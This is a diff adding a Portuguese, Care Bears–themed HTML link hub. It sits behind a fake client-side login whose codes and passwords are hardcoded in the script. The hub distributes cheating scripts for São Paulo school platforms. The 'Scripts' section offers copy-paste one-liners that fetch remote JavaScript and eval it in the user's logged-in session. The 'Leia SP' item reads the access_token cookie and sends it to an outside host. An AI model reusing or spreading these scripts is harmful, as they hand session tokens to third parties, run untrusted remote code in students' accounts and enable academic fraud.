@@ -1,0 +1,449 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Os Ursinhos Carinhosos</title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+<style>
+  :root{
+    --bg:#0d1117; --card:#161b22; --primary:#58a6ff; --muted:#8b949e; --radius:12px; --tile-bg:#21262d;
+  }
+  *{box-sizing:border-box}
+  body{font-family:Inter,system-ui,-apple-system,Arial,sans-serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:#c9d1d9;overflow-x:hidden}
+  .card{background:var(--card);padding:24px;border-radius:var(--radius);box-shadow:0 8px 30px rgba(0,0,0,.5);width:420px;max-width:95%}
+  h2{margin:0 0 12px 0;font-size:20px;color:#f0f6fc}
+  label{display:block;font-size:13px;margin:10px 0 6px 0;color:var(--muted)}
+  input{width:100%;padding:10px;border-radius:10px;border:1px solid #30363d;background:transparent;color:#f0f6fc}
+  .row{display:flex;gap:8px;margin-top:14px}
+  button{padding:10px 12px;border-radius:10px;border:0;cursor:pointer;background:var(--primary);color:white}
+  .msg{margin-top:12px;font-size:13px;color:#ff7b72;min-height:18px}
+  .small{font-size:12px;color:var(--muted);margin-top:8px}
+  #central{display:none;width:95%;max-width:1200px;margin:24px auto}
+  .central-wrap{padding:18px; position:relative}
+  .central-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+  /* PROFILE FIXADO NO CANTO SUPERIOR ESQUERDO (bem colado na borda) */
+  .user-profile{
+    position:fixed;
+    top:4px;      /* ajuste aqui para "descolar" mais da borda */
+    left:4px;     /* ajuste aqui para "descolar" mais da borda */
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:4px;
+    color:#f0f6fc;
+    z-index:10001;
+    pointer-events:none; /* evita bloquear cliques acidentais; a imagem não é clicável */
+  }
+  .user-profile img{width:44px;height:44px;border-radius:50%;border:2px solid var(--primary);background:#0b0f14;display:block}
+  .user-profile span{font-size:11px; color:#c9d1d9; margin-top:-2px; text-align:center; display:block; pointer-events:auto}
+  .sections{display:flex;flex-direction:column;gap:18px}
+  .section{background:var(--card);border-radius:12px;padding:14px;box-shadow:0 6px 18px rgba(0,0,0,.3)}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
+  .tile{display:flex;gap:10px;align-items:center;padding:10px;border-radius:10px;cursor:pointer;transition:transform .12s ease;background:var(--tile-bg);border:1px solid #30363d}
+  .tile:hover{transform:translateY(-4px);background:#2b303a}
+  .icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-size:18px}
+  .icon img{width:28px;height:28px;border-radius:6px;display:block}
+  .meta{display:flex;flex-direction:column}
+  .title{font-size:14px}
+  .subtitle{font-size:12px;color:var(--muted)}
+  .logout{background:#161b22;color:var(--primary);padding:8px 10px;border-radius:10px;border:0;cursor:pointer;pointer-events:auto}
+  @media (max-width:480px){ .grid{grid-template-columns:repeat(2,1fr)} .card{padding:18px} .user-profile{left:6px;top:6px} .user-profile img{width:40px;height:40px} }
+
+  /* Play button (hidden até login) */
+  #playButton{
+    position:fixed; bottom:20px; right:20px; width:64px; height:64px;
+    border-radius:50%; background:var(--primary); border:none; cursor:pointer;
+    z-index:9999; display:none; align-items:center; justify-content:center; font-size:26px; color:white;
+    box-shadow: 0 6px 18px rgba(88,166,255,0.22);
+  }
+
+  /* toast top-right */
+  #toast{
+    position:fixed; top:20px; right:20px; background:var(--primary); color:white; padding:10px 16px; border-radius:8px;
+    opacity:0; transform:translateY(-6px); transition:opacity .25s, transform .25s; z-index:10000; pointer-events:none;
+  }
+
+  /* money */
+  .money{position:fixed; top:-60px; font-size:20px; z-index:500; animation:fall linear infinite; will-change: transform, opacity;}
+  @keyframes fall{0%{transform:translateY(-50px) rotate(0deg); opacity:1}100%{transform:translateY(110vh) rotate(360deg); opacity:.95}}
+
+  /* hidden, offscreen player container (YouTube) */
+  #yt-player { width:0; height:0; overflow:hidden; position:fixed; left:-9999px; top:auto; }
+</style>
+</head>
+<body>
+
+<!-- PERFIL FIXO (fora da central) -->
+<div class="user-profile" id="userProfile" style="display:none;">
+  <img id="userImg" src="" alt="Ursinho">
+  <span id="userName"></span>
+</div>
+
+<!-- login -->
+<main id="main-login" class="card" aria-labelledby="titulo">
+  <h2 id="titulo">Entrar na Central</h2>
+  <label for="code">Código</label>
+  <input id="code" type="text" autocomplete="off" />
+  <label for="senha">Senha</label>
+  <input id="senha" type="password" autocomplete="off" />
+  <div class="row">
+    <button id="loginBtn">Entrar</button>
+    <button id="showBtn" type="button">Mostrar</button>
+  </div>
+  <div class="msg" id="msg"></div>
+  <div class="small">Quem é o seu Ursinho Carinhoso favorito e por quê?</div>
+</main>
+
+<!-- central -->
+<section id="central">
+  <div class="central-wrap">
+    <div class="central-header">
+      <div>
+        <h2 style="margin:0 0 4px 0">Central de Links</h2>
+        <div style="font-size:13px;color:var(--muted)">Clique em um item para abrir ou copiar.</div>
+      </div>
+      <div>
+        <button id="logoutBtn" class="logout">Sair</button>
+      </div>
+    </div>
+    <div class="sections" id="sectionsContainer"></div>
+  </div>
+</section>
+
+<!-- toast + YouTube player + play -->
+<div id="toast">Conteúdo copiado!</div>
+
+<!-- YouTube player container (oculto) -->
+<div id="yt-player"></div>
+
+<button id="playButton" aria-pressed="false" aria-label="Tocar música">▶</button>
+
+<!-- tile template -->
+<template id="tileTemplate">
+  <div class="tile" tabindex="0">
+    <div class="icon"></div>
+    <div class="meta">
+      <div class="title"></div>
+      <div class="subtitle"></div>
+    </div>
+  </div>
+</template>
+
+<script>
+/* ====== ELEMENTS ====== */
+const codeInput = document.getElementById('code');
+const passInput = document.getElementById('senha');
+const loginBtn = document.getElementById('loginBtn');
+const msg = document.getElementById('msg');
+const showBtn = document.getElementById('showBtn');
+const mainLogin = document.getElementById('main-login');
+const central = document.getElementById('central');
+const sectionsContainer = document.getElementById('sectionsContainer');
+const tileTemplate = document.getElementById('tileTemplate');
+const logoutBtn = document.getElementById('logoutBtn');
+const playBtn = document.getElementById('playButton');
+const toast = document.getElementById('toast');
+const userNameEl = document.getElementById('userName');
+const userImgEl = document.getElementById('userImg');
+const userProfileEl = document.getElementById('userProfile');
+
+/* ====== URSINHOS (CÓDIGO + SENHA + NOME + IMAGENS OFICIAIS + FALLBACK) ======
+   Os links principais usam a Fandom/Wikia (vignette). Se um link falhar,
+   o código automaticamente troca para o fallback (imgur) para evitar "sumir". */
+const ursinhos = [
+  { 
+    "name": "Good Luck Bear", 
+    "code": "1093", 
+    "pass": "b@123",
+    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/a/a3/GoodLuck1.png/revision/latest?cb=20190623214203",
+    "fallback": "https://i.imgur.com/6W0h0gG.png" 
+  },
+  { 
+    "name": "Love-a-Lot Bear", 
+    "code": "1083", 
+    "pass": "b25@",
+    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/d/dc/Funshine_bear_570x420.jpg/revision/latest?cb=20120723204753",
+    "fallback": "https://i.imgur.com/6iZ7fWx.png" 
+  },
+  { 
+    "name": "Funshine Bear", 
+    "code": "1132", 
+    "pass": "b23@",
+    "img": "https://i.pinimg.com/originals/d7/42/1a/d7421a39a328e5a35f5dd11d3fd63b10.jpg",
+    "fallback": "https://i.imgur.com/2qlR7oT.png" 
+  },
+  { 
+    "name": "Grams Bear", 
+    "code": "1127", 
+    "pass": "b23@",
+    "img": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/ed991cf4-7c8c-4530-b6ba-a3abf3ab2eae/debnzwm-f11c1961-567d-470b-be0f-515f929d5232.png/v1/fill/w_1600,h_1941,strp/care_bears__grams_bear__new__2d_by_joshuat1306_debnzwm-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTk0MSIsInBhdGgiOiJcL2ZcL2VkOTkxY2Y0LTdjOGMtNDUzMC1iNmJhLWEzYWJmM2FiMmVhZVwvZGVibnp3bS1mMTFjMTk2MS01NjdkLTQ3MGItYmUwZi01MTVmOTI5ZDUyMzIucG5nIiwid2lkdGgiOiI8PTE2MDAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.-nimJdw8Ugauhnb_8KYjtWDw6t3o6KW3L65q8TLmA-8",
+    "fallback": "https://i.imgur.com/Zb2M1lh.png" 
+  },
+  { 
+    "name": "Grumpy Bear", 
+    "code": "1125", 
+    "pass": "b23@",
+    "img": "https://vignette.wikia.nocookie.net/carebears/images/4/46/Grumpy_Bear.png",
+    "fallback": "https://i.imgur.com/WJjvFZj.png" 
+  },
+  { 
+    "name": "Bedtime Bear", 
+    "code": "1104", 
+    "pass": "g@123",
+    "img": "https://vignette.wikia.nocookie.net/carebears/images/f/f1/Bedtime_Bear.png",
+    "fallback": "https://i.imgur.com/4kKf6Q2.png" 
+  },
+  { 
+    "name": "Cheer Bear", 
+    "code": "1132", 
+    "pass": "b23@",
+    "img": "https://static.wikia.nocookie.net/welcometocarealot/images/c/c7/Cheer_bear_570x420.jpg/revision/latest?cb=20120723210347",
+    "fallback": "https://i.imgur.com/UsqThLQ.png" 
+  }
+]
+;
+
+let attempts = 0, maxAttempts = 5, lockedUntil = 0;
+
+function updateMessage(text, success=false){
+  msg.textContent = text;
+  msg.className = success ? 'msg success' : 'msg';
+}
+function lockFor(seconds){
+  lockedUntil = Date.now() + seconds*1000;
+  updateMessage(`Muitas tentativas. Tente novamente em ${seconds} segundos.`);
+  loginBtn.disabled = true;
+  setTimeout(()=>{ loginBtn.disabled = false; updateMessage(''); }, seconds*1000);
+}
+function checkCredentials(code, password){
+  return ursinhos.find(u => u.code === code.trim() && u.pass === password);
+}
+
+/* ====== LOGIN ====== */
+loginBtn.addEventListener('click', ()=> {
+  if(Date.now() < lockedUntil){ updateMessage('Conta temporariamente bloqueada.'); return; }
+  const code = codeInput.value, password = passInput.value;
+  if(!code || !password){ updateMessage('Preencha código e senha.'); return; }
+  const ursinho = checkCredentials(code,password);
+  if(ursinho){
+    updateMessage('Acesso liberado!', true);
+    openCentral(ursinho);
+  } else{
+    attempts++;
+    if(attempts >= maxAttempts){ lockFor(15); attempts = 0; }
+    else updateMessage(`Código ou senha incorretos. Tentativas: ${attempts}/${maxAttempts}`);
+  }
+});
+passInput.addEventListener('keypress', e=>{ if(e.key === 'Enter') loginBtn.click(); });
+showBtn.addEventListener('click', ()=>{ const t = passInput.type === 'password' ? 'text' : 'password'; passInput.type = t; showBtn.textContent = t === 'text' ? 'Ocultar' : 'Mostrar'; });
+
+/* ====== CENTRAL DATA ====== */
+const centralSections = [
+  { id:'apostilas', title:'Apostilas / Livros', items:[
+      { title:'POR/MAT', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138013/1262487.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'HIS/GEO', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138038/1262582.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'FÍS/BIO/QUÍ', subtitle:'PDF', url:'https://acervocmsp.educacao.sp.gov.br/138040/1262595.pdf', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+  ]},
+  { id:'scripts', title:'Scripts', items:[
+      { title:'Redação', subtitle:'Clique para copiar', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/RedaSP-IA.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
+      { title:'Speak', subtitle:'Clique para copiar', code:'fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r => r.text()).then(r => eval(r))', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
+      { title:'Khan Academy', subtitle:'Clique para copiar', code:'fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(t=>t.text()).then(eval);', icon:'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkD27JRbnRUkTmfVQP6OOupXZKjfOhF5JMLA&s' },
+      { title:'Leia SP', subtitle:'Clique para copiar', code:'!function(){if("livros.arvore.com.br"!==location.host)return alert("Este script só funciona no Árvore!");open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split("access_token=")[1].split(";")[0]))}`)}();', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'Expansão Noturna', subtitle:'Clique para copiar', code:'fetch("https://corsproxy.io/?url=https://raw.githubusercontent.com/DarkModde/Dark-Scripts/refs/heads/main/ExNoturnoFDS.js").then(t=>t.text()).then(eval);', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+  ]},
+  { id:'website', title:'Website', items:[
+      { title:'Tarefas', subtitle:'Clique para abrir', url:'https://taskitos.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/9c1ba3f2d4e91f3d221d56cb9e4b4e8bd3c2404bcb7b28c0989b35b56759df8c/68747470733a2f2f692e696d6775722e636f6d2f584943736763482e706e67' },
+      { title:'Redação', subtitle:'Clique para abrir', url:'https://redacao.cupiditys.lol/?cmsphacks.xyz', icon:'https://camo.githubusercontent.com/557ad68f0a36c0067b8c94210fcdf3000374b7378ddad748478d4a0dc854da21/68747470733a2f2f692e696d6775722e636f6d2f6c336c584839302e706e67' },
+      { title:'Speak', subtitle:'Clique para abrir', url:'https://speakify.cupiditys.lol/install', icon:'https://camo.githubusercontent.com/d1de9e6085ec102352e59d0ffb530c6c2776f39a2608058b13235896bf7acd69/68747470733a2f2f692e696d6775722e636f6d2f706978363644352e706e67' },
+      { title:'Leia SP', subtitle:'Clique para abrir', url:'https://leia.cmsphacks.xyz/?cmsphacks.xyz', icon:'https://is1-ssl.mzstatic.com/image/thumb/Purple122/v4/6a/c7/e4/6ac7e4d5-cb34-522d-b80d-8a465ac50d7e/AppIcon-1x_U007emarketing-0-7-0-85-220.png/1200x630wa.png' },
+      { title:'Expansão Noturna', subtitle:'Clique para abrir', url:'https://crimsonstrauss.xyz/expansao', icon:'https://camo.githubusercontent.com/4e0626916bfca146cae1641a69749205ee1bf2ddebd1e116b9895efbdb7ebd43/68747470733a2f2f692e696d6775722e636f6d2f676a766468626f2e706e67' },
+  ]},
+  { id:'links', title:'Links', items:[
+      { title:'Sala do Futuro', subtitle:'Clique para abrir', url:'https://acervocmsp.educacao.sp.gov.br', icon:'https://play-lh.googleusercontent.com/l6L7nJ8fVp4J6Unx9V_V5iD--FAOW2b6SGrs3p3c_N4q8n2da7qpxiddwKl2HmxZ3Ykd' },
+      { title:'Discord 1', subtitle:'Clique para abrir', url:'https://discord.gg/NhuTd37Z', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
+      { title:'Discord 2', subtitle:'Clique para abrir', url:'https://discord.gg/vTRynvhje', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
+      { title:'Discord 3', subtitle:'Clique para abrir', url:'https://discord.gg/rnYjkRA8', icon:'https://cdn-icons-png.flaticon.com/512/2111/2111370.png' },
+      { title:'Tutorial YouTube', subtitle:'Clique para abrir', url:'https://youtube.com/playlist?list=PLmPgXmAk1aVTd6UsfopLMKTAlQ0FXx0IW&si=4lkbjPWksFhhcfGX', icon:'https://cdn-icons-png.flaticon.com/512/1384/1384060.png' },
+      { title:'GitHub', subtitle:'Clique para abrir', url:'https://github.com/DarkModde/CMSP-Plataformas-Hacks', icon:'https://cdn-icons-png.flaticon.com/512/25/25231.png' },
+  ]}
+];
+
+function renderCentral(){
+  sectionsContainer.innerHTML = '';
+  centralSections.forEach(section=>{
+    const secEl = document.createElement('div');
+    secEl.className = 'section';
+    const h = document.createElement('h3'); h.textContent = section.title; secEl.appendChild(h);
+
+    const grid = document.createElement('div'); grid.className = 'grid';
+    section.items.forEach(item=>{
+      const tpl = tileTemplate.content.cloneNode(true);
+      const tile = tpl.querySelector('.tile');
+      const icon = tpl.querySelector('.icon');
+      const title = tpl.querySelector('.title');
+      const subtitle = tpl.querySelector('.subtitle');
+
+      if(item.icon){
+        const img = document.createElement('img');
+        img.src = item.icon;
+        img.alt = item.title;
+        // fallback se icon falhar
+        img.onerror = () => { if(item.iconFallback) img.src = item.iconFallback; };
+        icon.appendChild(img);
+      }
+
+      title.textContent = item.title;
+      subtitle.textContent = item.subtitle || '';
+
+      tile.addEventListener('click', async ()=>{
+        if(item.url){
+          window.open(item.url,'_blank','noopener');
+        } else if(item.code){
+          try {
+            await navigator.clipboard.writeText(item.code);
+            showToast('Script copiado!');
+          } catch(err){
+            showToast('Erro ao copiar');
+          }
+        }
+      });
+      tile.addEventListener('keydown', e=>{ if(e.key==='Enter') tile.click(); });
+      grid.appendChild(tpl);
+    });
+
+    secEl.appendChild(grid);
+    sectionsContainer.appendChild(secEl);
+  });
+}
+
+/* ====== OPEN / LOGOUT ====== */
+function openCentral(ursinho){
+  mainLogin.style.display = 'none';
+  central.style.display = 'block';
+  document.body.style.alignItems = 'flex-start';
+  renderCentral();
+  codeInput.value = ''; passInput.value = ''; updateMessage('');
+  // mostra foto e nome do ursinho no canto superior esquerdo (fixo)
+  userImgEl.src = ursinho.img;
+  userImgEl.alt = ursinho.name;
+  // se img principal falhar, tenta fallback
+  userImgEl.onerror = () => { if(ursinho.fallback) userImgEl.src = ursinho.fallback; };
+  userNameEl.textContent = ursinho.name;
+  userProfileEl.style.display = 'flex';
+  // mostrar play button
+  playBtn.style.display = 'flex';
+  playBtn.focus();
+}
+
+logoutBtn.addEventListener('click', ()=>{ 
+  central.style.display = 'none'; 
+  mainLogin.style.display = 'block'; 
+  document.body.style.alignItems='center';
+  // limpa perfil
+  userImgEl.src = ''; userNameEl.textContent = ''; userProfileEl.style.display = 'none';
+  // pause no player ao sair
+  try { if(typeof player !== 'undefined' && player && player.pauseVideo) player.pauseVideo(); } catch(e){}
+  stopRain();
+  setPlayIcon(false);
+  playBtn.style.display = 'none';
+});
+document.addEventListener('keydown', e=>{ if(e.key==='Escape' && central.style.display==='block') logoutBtn.click(); });
+
+/* ====== TOAST ====== */
+let toastTimeout = null;
+function showToast(text, ms = 1500){
+  toast.textContent = text;
+  toast.style.opacity = '1';
+  toast.style.transform = 'translateY(0)';
+  if(toastTimeout) clearTimeout(toastTimeout);
+  toastTimeout = setTimeout(()=>{ toast.style.opacity = '0'; toast.style.transform = 'translateY(-6px)'; }, ms);
+}
+
+/* ====== RAIN ====== */
+let raining = false;
+let rainElements = [];
+
+function createMoneyElement(){
+  const span = document.createElement('span');
+  span.className = 'money';
+  span.textContent = '💸';
+  span.style.left = (Math.random() * 100) + 'vw';
+  span.style.fontSize = (14 + Math.random()*18) + 'px';
+  span.style.animationDuration = (4 + Math.random()*5) + 's';
+  span.style.opacity = (0.6 + Math.random()*0.4);
+  span.dataset.rain = '1';
+  return span;
+}
+
+function startRain(count = 30){
+  if(raining) return;
+  raining = true;
+  for(let i=0;i<count;i++){
+    const el = createMoneyElement();
+    document.body.appendChild(el);
+    rainElements.push(el);
+  }
+}
+
+function stopRain(){
+  raining = false;
+  while(rainElements.length){
+    const el = rainElements.pop();
+    if(el && el.parentNode) el.parentNode.removeChild(el);
+  }
+}
+
+/* ====== YOUTUBE IFRAME PLAYER ====== */
+let player = null;
+let ytReady = false;
+const VIDEO_ID = 'WrLUqugWEyU';
+let playerLoadedTimeout = null;
+
+function setPlayIcon(isPlaying){
+  playBtn.textContent = isPlaying ? '⏸' : '▶';
+  playBtn.setAttribute('aria-pressed', String(!!isPlaying));
+  playBtn.title = isPlaying ? 'Pausar música' : 'Tocar música';
+}
+
+(function loadYouTubeAPI(){
+  if(window.YT && window.YT.Player){ return onYouTubeApiReady(); }
+  const tag = document.createElement('script');
+  tag.src = "https://www.youtube.com/iframe_api";
+  const firstScriptTag = document.getElementsByTagName('script')[0];
+  firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+})();
+
+function onYouTubeApiReady(){
+  player = new YT.Player('yt-player', {
+    height: '0', width: '0',
+    videoId: VIDEO_ID,
+    playerVars: { autoplay:0, controls:0, rel:0, modestbranding:1, enablejsapi:1, iv_load_policy:3, playsinline:1 },
+    events: {
+      onReady: (e) => { ytReady=true; setPlayIcon(false); playBtn.disabled=false; showToast('Player pronto',900); },
+      onStateChange: (e) => { if(e.data===YT.PlayerState.PLAYING){ setPlayIcon(true); startRain(); } else { setPlayIcon(false); stopRain(); } },
+      onError: (e)=>{ console.error('YouTube player error', e); showToast('Erro no player do YouTube'); }
+    }
+  });
+  if(playerLoadedTimeout) clearTimeout(playerLoadedTimeout);
+  playerLoadedTimeout = setTimeout(()=>{
+    if(!ytReady){ playBtn.disabled=false; showToast('API do YouTube demorou a responder. Tente clicar no botão.',2500); }
+  },5000);
+}
+
+playBtn.addEventListener('click', () => {
+  if(!ytReady || !player){ showToast('Player ainda carregando...'); if(window.onYouTubeIframeAPIReady) try{ window.onYouTubeIframeAPIReady(); } catch(e){}; return; }
+  const state = player.getPlayerState();
+  if(state !== YT.PlayerState.PLAYING){ try { player.playVideo(); } catch(err){ console.error('Erro ao playVideo()', err); showToast('Falha ao iniciar reprodução'); } }
+  else { try { player.pauseVideo(); } catch(err){ console.error(err); showToast('Falha ao pausar'); } }
+});
+playBtn.addEventListener('keydown', e=>{ if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); playBtn.click(); } });
+
+window.addEventListener('beforeunload', ()=> { try { if(player && player.pauseVideo) player.pauseVideo(); } catch(e){}; stopRain(); });
+
+setPlayIcon(false);
+playBtn.disabled = true;
+window.onYouTubeIframeAPIReady = function(){ onYouTubeApiReady(); };
+</script>
+</body>
+</html>
